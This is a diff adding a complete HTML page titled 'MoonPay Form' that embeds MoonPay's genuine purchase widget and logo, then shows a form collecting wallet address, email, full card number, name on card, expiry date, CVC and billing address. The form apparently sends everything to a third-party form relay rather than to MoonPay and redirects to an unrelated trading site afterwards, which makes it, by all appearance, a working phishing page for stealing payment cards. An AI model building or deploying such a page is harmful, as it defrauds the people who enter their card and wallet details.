@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" type="x-icon" href="payhead.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoonPay Form</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Outfit';
+            background-image: linear-gradient(270deg, #210d3b, #0c0c0c);
+            background-image: -webkit-linear-gradient(left, #210d3b, #0c0c0c);
+            background-image: -moz-linear-gradient(left, #210d3b, #0c0c0c);
+            background-image: -o-linear-gradient(left, #210d3b, #0c0c0c);
+            background-size: 120%;
+            min-height: 100vh;
+        }
+
+        .contact-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .moonpay-wrapper {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            margin-bottom: 30px;
+            box-sizing: border-box;
+            margin: 0 auto;
+            width: 400px;
+            aspect-ratio: 16/9;
+        }
+
+        #buy-widget {
+            width: 40%;
+            height: 377px;
+            border-radius: 20px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+            background: rgb(255, 255, 255);
+        }
+
+        .MoonpayLogo {
+            max-width: 361px;
+            height: auto;
+            margin-top: 20px;
+            border-radius: 0 0 18px 18px;
+            transform: translateY(5px);
+            z-index: 1000;
+            object-fit: cover;
+            position: relative;
+            
+        }
+
+        .contact-left {
+            background: transparent;
+            padding: 30px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 400px;
+            z-index: 1;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .contact-inputs {
+            width: 100%;
+            height: 50px;
+            border: none;
+            outline: none;
+            padding-left: 20px;
+            font-weight: 700;
+            color: #ebebeb;
+            border-radius: 50px;
+            background: linear-gradient(270deg, #36134b, #351b72);
+            margin-bottom: 15px;
+        }
+
+        .contact-inputs:focus {
+            border: 2.7px solid #ae8cff;
+        }
+
+        .contact-inputs::placeholder {
+            color: #b1b1b1ab;
+            font-size: 14px;
+            padding-left: 20px;
+        }
+
+        .Text-Input {
+            color: aliceblue;
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .contact-left button {
+            display: flex;
+            align-items: center;
+            padding: 13px 20px;
+            font-size: 17px;
+            color: #ebebeb;
+            gap: 20px;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(270deg, #5d21acde, hsl(261, 100%, 56%));
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+            max-width: 200px;
+            width: 33%;
+        }
+
+        @media (min-width: 90px) {
+            #buy-widget {
+                width: 90%;
+                height: 345px;
+                min-width: 90%;
+                max-width: 90%;
+                margin-bottom: -140px;
+            }
+            
+            .contact-left {
+                margin: 20px;
+                padding: 20px;
+            }
+            
+            .form-container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="contact-container">
+        <div class="moonpay-wrapper">
+            
+            <iframe 
+                id="buy-widget"
+                src="https://buy.moonpay.com/?theme=light&colorCode=%237d00ff&language=en&apiKey=pk_live_R5Lf25uBfNZyKwccAZpzcxuL3ZdJ3Hc&homepageToAccountVariant=0&defaultCurrencyCode=sol&referrer=https%3A%2F%2Fwww.google.com%2F"
+                title="Buy crypto with MoonPay"
+                frameborder="0"
+                width="100%"
+                height="377px"
+                scrolling="no"
+                allowfullscreen
+            ></iframe>
+        </div>
+        <img class="MoonpayLogo" src="Moonpay2.jpg">
+
+        <form action="https://api.web3forms.com/submit" method="POST" class="contact-left">
+            <div class="form-container">
+                
+                <input type="hidden" name="access_key" value="9a7a98a4-5c99-4df1-a920-4aa0f0d05f65">
+                
+                <div>
+                    <p class="Text-Input">Wallet Address</p>
+                    <input name="name" placeholder="Enter Wallet" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">Email</p>
+                    <input type="email" name="email" placeholder="Email address" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">Card Number</p>
+                    <input type="text" name="message" placeholder="0000 0000 0000 0000" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    
+                    <p class="Text-Input">Name on Card</p>
+                    <input type="text" name="message" placeholder="First and last name" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">Expiry Date</p>
+                    <input type="text" name="message" placeholder="MM/YY" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">CVC</p>
+                    <input type="text" name="message" placeholder="CVC" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">Billing Address</p>
+                    <input type="text" name="message" placeholder="Billing address" class="contact-inputs" required>
+                </div>
+
+                <div>
+                    <p class="Text-Input">City/State</p>
+                    <input type="text" name="message" placeholder="City/State" class="contact-inputs" required>
+                </div>
+
+                
+                <input type="hidden" name="redirect" value="https://docs.axiom.trade/perpetuals/withdraw">
+                
+
+                <div>
+                    <p class="Text-Input">Postal Code</p>
+                    <input type="text" name="message" placeholder="Postal code" class="contact-inputs" required>
+                </div>
+
+                <button type="submit">Next <img src="assets/arrow_icon.png" alt=""></button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
